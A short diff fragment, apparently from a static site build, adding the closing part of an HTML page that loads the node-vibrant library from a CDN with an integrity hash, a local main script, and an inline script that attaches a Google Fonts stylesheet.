+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.9feb0937132291db314540e31350de0da717928ca87e53cdebf73f0dfcdc569c.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
